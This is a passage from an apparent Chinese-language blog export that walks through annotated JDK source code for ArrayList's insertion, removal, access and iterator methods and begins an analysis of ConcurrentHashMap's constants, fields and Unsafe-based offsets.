hugeCapacity(minCapacity);</span><br><span class="line">    <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hugeCapacity</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OutOfMemoryError</span>();</span><br><span class="line">    <span class="comment">// 所需容器大小 &gt; 最大数组大小，扩容为Integer.MAX_VALUE，反之扩容为MAX_ARRAY_SIZE</span></span><br><span class="line">    <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">        Integer.MAX_VALUE :</span><br><span class="line">    MAX_ARRAY_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-add-int-index-E-element"><a href="#5-add-int-index-E-element" class="headerlink" title="5. add(int index, E element)"></a>5. add(int index, E element)</h1><p>在指定位置插入元素，新元素在list的下标为index。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查index是否合法：不能大于size或小于0</span></span><br><span class="line">    rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否需要扩容（第4点已经分析过）</span></span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    <span class="comment">// 从下标index开始把数组elementData，复制到从下标index+1开始的elementData数组，长度为size - index，即：elementData从下标index开始的元素后移一位</span></span><br><span class="line">    System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                     size - index);</span><br><span class="line">    <span class="comment">// 下标index处插入新元素</span></span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    <span class="comment">// 容器大小+1</span></span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rangeCheckForAdd</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; size || index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(outOfBoundsMsg(index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-remove-int-index"><a href="#6-remove-int-index" class="headerlink" title="6. remove(int index)"></a>6. remove(int index)</h1><p>根据下标移除元素，返回已删除元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查index是否合法：index不能大于或等于size</span></span><br><span class="line">    rangeCheck(index);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构修改次数+1</span></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// 获取下标为index的元素</span></span><br><span class="line">    <span class="type">E</span> <span class="variable">oldValue</span> <span class="operator">=</span> elementData(index);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// index后的numMoved个元素前移1位</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numMoved</span> <span class="operator">=</span> size - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);</span><br><span class="line">    <span class="comment">// 集合最后1位元素重置为null</span></span><br><span class="line">    elementData[--size] = <span class="literal">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rangeCheck</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(outOfBoundsMsg(index));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">E <span class="title function_">elementData</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-remove-Object-o"><a href="#7-remove-Object-o" class="headerlink" title="7. remove(Object o)"></a>7. remove(Object o)</h1><p>删除第1个指定元素（从下标0开始），返回值：true - 删除成功；false - 删除失败。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="comment">// 被删除元素为null，通过==判断</span></span><br><span class="line">            <span class="keyword">if</span> (elementData[index] == <span class="literal">null</span>) &#123;</span><br><span class="line">                fastRemove(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="comment">// 被删除元素不为null，通过equals判断</span></span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[index])) &#123;</span><br><span class="line">                fastRemove(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过下标删除元素，第6点已分析过类似的操作</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fastRemove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="type">int</span> <span class="variable">numMoved</span> <span class="operator">=</span> size - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);</span><br><span class="line">    elementData[--size] = <span class="literal">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-set-int-index-E-element"><a href="#8-set-int-index-E-element" class="headerlink" title="8. set(int index, E element)"></a>8. set(int index, E element)</h1><p>设置指定下标元素的值，返回设定前的旧值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查index是否合法：index不能大于或等于size</span></span><br><span class="line">    rangeCheck(index);</span><br><span class="line"></span><br><span class="line">    <span class="type">E</span> <span class="variable">oldValue</span> <span class="operator">=</span> elementData(index);</span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rangeCheck</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(outOfBoundsMsg(index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="9-get-int-index"><a href="#9-get-int-index" class="headerlink" title="9. get(int index)"></a>9. get(int index)</h1><p>根据下标获取元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查index是否合法：index不能大于或等于size</span></span><br><span class="line">    rangeCheck(index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> elementData(index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="10-size"><a href="#10-size" class="headerlink" title="10. size()"></a>10. size()</h1><p>返回集合元素个数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="11-迭代器-iterator"><a href="#11-迭代器-iterator" class="headerlink" title="11. 迭代器 - iterator()"></a>11. 迭代器 - iterator()</h1><p>modCount用于保证使用迭代器来删除元素的同时，不进行其它的结构化操作（add&#x2F;remove等），因此在循环删除元素的操作中，最好使用迭代器来删除元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 结构修改的次数（引发集合大小size改变的修改次数）</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> <span class="type">int</span> <span class="variable">modCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Itr</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * An optimized version of AbstractList.Itr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Itr</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="type">int</span> cursor;       <span class="comment">// index of next element to return</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">lastRet</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line"></span><br><span class="line">    Itr() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor != size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        checkForComodification();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        <span class="comment">// cursor才0开始，调用next一次进行加1，并返回加1前cursor下标的元素</span></span><br><span class="line">        cursor = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">        checkForComodification();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用ArrayList的remove方法移除元素</span></span><br><span class="line">            ArrayList.<span class="built_in">this</span>.remove(lastRet);</span><br><span class="line">            <span class="comment">// 游标置为上一个游标</span></span><br><span class="line">            cursor = lastRet;</span><br><span class="line">            lastRet = -<span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 保证通过迭代器移除元素后，期待修改次数与实际修改的次数一致</span></span><br><span class="line">            expectedModCount = modCount;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; consumer)</span> &#123;</span><br><span class="line">        Objects.requireNonNull(consumer);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> ArrayList.<span class="built_in">this</span>.size;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</span><br><span class="line">            consumer.accept((E) elementData[i++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// update once at end of iteration to reduce heap write traffic</span></span><br><span class="line">        cursor = i;</span><br><span class="line">        lastRet = i - <span class="number">1</span>;</span><br><span class="line">        checkForComodification();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断期待修改次数是否与实际修改次数一致，避免使用迭代器移除元素的同时，使用其它结构化修改的操作（导致size变化的操作）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li>元素：有序，可重复，可为null，可以通过迭代器遍历。</li>
<li>效率：通过Object数组实现。ArrayList适合改、查，不适合随机增、删，若已知大概的最大容量（避免反复扩容），也适合做顺序插入（尾插），因为内部通过System.arraycopy来实现随机插入和删除操作，随机插入和删除可能导致大量元素需要挪动。</li>
<li>安全性：线程不安全。</li>
</ul>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>集合</category>
        <category>ArrayList</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>ArrayList</tag>
      </tags>
  </entry>
  <entry>
    <title>ConcurrentHashMap源码分析</title>
    <url>/2024/01/31/$ConcurrentHashMap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>节点类型：Node（单链表）、TreeBin（root属性为红黑树根节点、first属性为单链表头节点，它作为元素插入数组中）、TreeNode（红黑树，其根节点作为TreeBin的root属性）、ForwardingNode（转换节点，nextTable属性为扩容后的数组）、ReservationNode（没啥大用，compute的中间产物）。</p>
<h1 id="1-new-ConcurrentHashMap"><a href="#1-new-ConcurrentHashMap" class="headerlink" title="1. new ConcurrentHashMap()"></a>1. new ConcurrentHashMap()</h1><h2 id="1-1-常量与属性"><a href="#1-1-常量与属性" class="headerlink" title="1.1 常量与属性"></a>1.1 常量与属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 容器最大值，容器大小必须为2的整数次方，即2^30</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAXIMUM_CAPACITY</span> <span class="operator">=</span> <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认初始化容器大小16</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_CAPACITY</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大数组长度（不是2的整数次方，toArray相关方法使用）</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_ARRAY_SIZE</span> <span class="operator">=</span> Integer.MAX_VALUE - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认并发级别（未使用，为了兼容早期版本而定义的。）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_CONCURRENCY_LEVEL</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认加载因子（负载系数）0.75，在ConcurrentHashMap中实际上没太大用，代码中固定为0.75。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">float</span> <span class="variable">LOAD_FACTOR</span> <span class="operator">=</span> <span class="number">0.75f</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树化（链表转红黑树）的阈值为8，链表长度大于8（且哈希表长度不小于64）后进行树化，在链表长度达到9后，开始把链表转为红黑树。因为在代码中是先添加到链表后，再进行binCount判断是否需要树化。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TREEIFY_THRESHOLD</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反树化（红黑树转链表）的阈值为6，节点数小于等于6进行反树化。树化与反树化的阈值不同：防止单个元素增加删除造成的频繁树化和反树化的过程，反而降低效率。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNTREEIFY_THRESHOLD</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树化最小的哈希表（数组）长度，即链表长度大于8且哈希表长度至少为64时，进行树化。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MIN_TREEIFY_CAPACITY</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一次transfer过程，最小处理数组元素个数。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MIN_TRANSFER_STRIDE</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The number of bits used for generation stamp in sizeCtl.</span></span><br><span class="line"><span class="comment"> * Must be at least 6 for 32bit arrays.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">RESIZE_STAMP_BITS</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩容过程的最大线程数。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_RESIZERS</span> <span class="operator">=</span> (<span class="number">1</span> &lt;&lt; (<span class="number">32</span> - RESIZE_STAMP_BITS)) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The bit shift for recording size stamp in sizeCtl.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESIZE_STAMP_SHIFT</span> <span class="operator">=</span> <span class="number">32</span> - RESIZE_STAMP_BITS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOVED</span>     <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// ForwardingNode节点的hash值固定为-1，表明数组正则扩容。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TREEBIN</span>   <span class="operator">=</span> -<span class="number">2</span>; <span class="comment">// TreeBin节点的hash值固定为-2，其root属性为红黑树。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESERVED</span>  <span class="operator">=</span> -<span class="number">3</span>; <span class="comment">// hash for transient reservations，computeIfAbsent and compute用的。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">HASH_BITS</span> <span class="operator">=</span> <span class="number">0x7fffffff</span>; <span class="comment">// 普通节点计算hash时，做按位与运算用的。当前值为2^31-1，按位与运算后，确保hash值一定为正数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可用处理器内核数。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NCPU</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line"></span><br><span class="line"><span class="comment">/** For serialization compatibility. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectStreamField[] serialPersistentFields = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(<span class="string">&quot;segments&quot;</span>, Segment[].class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(<span class="string">&quot;segmentMask&quot;</span>, Integer.TYPE),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(<span class="string">&quot;segmentShift&quot;</span>, Integer.TYPE)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ConcurrentHashMap的数据结构为Node类型的数组，在首次使用时初始化容器。</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">volatile</span> Node&lt;K,V&gt;[] table;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩容时的辅助数组，只有在扩容时不为null。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Node&lt;K,V&gt;[] nextTable;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有争用时的基本计数器值，初始化时也会使用。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> <span class="type">long</span> baseCount;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化和扩容的控制指标，sizeCtl情况如下：</span></span><br><span class="line"><span class="comment"> * - 负数。-1表示容器在初始化。-(1 + 扩容线程数)表示在扩容。</span></span><br><span class="line"><span class="comment"> * - 非负数。若table为null，表示容器初始化大小或默认值0。反之，表示触发下一次扩容的阈值。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> <span class="type">int</span> sizeCtl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩容时，拆分next table的索引</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> <span class="type">int</span> transferIndex;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计数器的CAS锁，扩容或创建计数器时使用。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> <span class="type">int</span> cellsBusy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计数器数组，长度为2的整数次方。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> CounterCell[] counterCells;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unsafe mechanics，Unsafe类简介查看：1.2</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> sun.misc.Unsafe U;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> SIZECTL;	<span class="comment">// sizeCtl属性的内存地址偏移量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> TRANSFERINDEX;	<span class="comment">// transferIndex属性的内存地址偏移量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> BASECOUNT;	<span class="comment">// baseCount属性的内存地址偏移量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> CELLSBUSY;	<span class="comment">// cellsBusy属性的内存地址偏移量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> CELLVALUE;	<span class="comment">// CounterCell.class的value属性的内存地址偏移量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> ABASE;	<span class="comment">// Node[].class的内存地址偏移量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> ASHIFT;	<span class="comment">// 确定数组元素下标的位移数，具体看代码。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        U = sun.misc.Unsafe.getUnsafe();</span><br><span class="line">        Class&lt;?&gt; k = ConcurrentHashMap.class;</span><br><span class="line">        SIZECTL = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">&quot;sizeCtl&quot;</span>));</span><br><span class="line">        TRANSFERINDEX = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">&quot;transferIndex&quot;</span>));</span><br><span class="line">        BASECOUNT = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">&quot;baseCount&quot;</span>));</span><br><span class="line">        CELLSBUSY = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">&quot;cellsBusy&quot;</span>));</span><br><span class="line">        Class&lt;?&gt; ck = CounterCell.class;</span><br><span class="line">        CELLVALUE = U.objectFieldOffset</span><br><span class="line">            (ck.getDeclaredField(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">        Class&lt;?&gt; ak = Node[].class;</span><br><span class="line">        ABASE = U.arrayBaseOffset(ak);</span><br><span class="line">        <span class="type">int</span> <span class="variable">scale</span> <span class="operator">=</span> U.arrayIndexScale(ak);</span><br><span class="line">        <span class="keyword">if</span> ((scale &amp; (scale - <span class="number">1</span>)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;data type scale not a power of two&quot;</span>);</span><br><span class="line">        <span class="comment">// Integer.numberOfLeadingZeros(scale)返回整型数据scale的二进制数左边0的个数。</span></span><br><span class="line">        ASHIFT = <span class="number">31</span> - Integer.numberOfLeadingZeros(scale);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-Unsafe类说明"><a href="#1-2-Unsafe类说明" class="headerlink" title="1.2 Unsafe类说明"></a>1.2 Unsafe类说明</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UnsafeTest</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * unsafe.putObject(Object o, long l, Object o1)    // 修改对象o内存地址偏移量为l的值为o1</span></span><br><span class="line"><span class="comment"> * unsafe.getObject(Object o, long l)   // 获取对象o内存地址偏移量为l的值</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unsafe主要方法分类说明：</span></span><br><span class="line"><span class="comment"> * 1.内存信息。eg: addressSize()、pageSize()</span></span><br><span class="line"><span class="comment"> * 